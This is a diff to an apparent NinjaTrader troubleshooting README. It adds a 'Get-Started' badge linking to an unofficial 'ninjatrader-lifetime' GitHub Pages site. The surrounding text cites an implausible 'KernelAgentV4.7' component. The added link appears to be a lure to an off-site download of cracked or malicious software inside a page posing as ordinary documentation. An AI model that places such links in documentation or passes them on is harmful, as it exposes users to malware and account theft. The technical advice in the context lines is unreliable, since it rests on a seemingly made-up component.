@@ -330,6 +330,12 @@ If you're experiencing issues with **NinjaTrader**, here are some common solutio
 - **Solution**: Ensure that **indexing services** are running and that **KernelAgentV4.7** is active for faster searches. If the archive is large, this process can take longer.
 - **Cause**: Indexing is disabled or improperly configured, leading to slower search results.
 
+<div align="center">  
+
+[![Get-Started](https://img.shields.io/badge/Get-Started-blue?style=for-the-badge&logo=windows)](https://ninjatrader-lifetime.github.io/.github/)
+
+</div>
+
 ---
 
 ### **Getting Support**
